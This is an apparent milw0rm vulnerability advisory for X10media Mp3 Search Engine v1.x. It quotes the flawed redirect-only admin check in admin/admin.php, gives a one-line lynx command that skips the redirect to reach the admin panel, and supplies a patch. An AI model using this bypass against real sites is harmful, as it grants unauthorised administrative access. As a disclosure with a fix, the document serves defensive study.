@@ -1,0 +1,96 @@
+################# ~THUNDER ################################################################
+
+
+    ~Product: X10media Mp3 Search Engine v1.x Admin Access Vulnerability
+    ~Author : THUNDER <t4h[at]hotmail.fr>
+    ~File : admin/admin.php
+
+##### ~Vulnerable Code ############################################################################
+
+
+/**
+
+ * User not an administrator, redirect to main page
+
+ * automatically.
+
+ */
+
+if(!$session->isAdmin()){
+
+   header("Location: ../main.php");
+
+}
+
+else{
+
+/**
+
+ * Administrator is viewing page, so display all
+
+ * forms.
+
+ */
+
+}
+----------------------------------------
+
+if the user is not admin redirect it to main.php, so we can exploit it using lynx by disabling redirection.
+ 
+##### ~Exploit ############################################################################
+
+lynx -noredir http://www.vulnerable.com/admin/admin.php
+
+allow the cookies, and you're in admin panel.
+
+
+##### ~Solution ############################################################################
+
+Open admin/admin.php
+1- find:
+
+/**
+
+ * User not an administrator, redirect to main page
+
+ * automatically.
+
+ */
+
+if(!$session->isAdmin()){
+
+   header("Location: ../main.php");
+
+}
+
+else{
+
+/**
+
+ * Administrator is viewing page, so display all
+
+ * forms.
+
+ */
+
+}
+
+
+
+2- Replace it with:
+
+/**
+
+ * User not an administrator, show error 404
+
+ */
+
+if(!$session->isAdmin()){
+
+   die(header("HTTP/1.1 404 Not Found"));
+
+}
+
+###########################################################################################
+
+# milw0rm.com [2009-04-13]
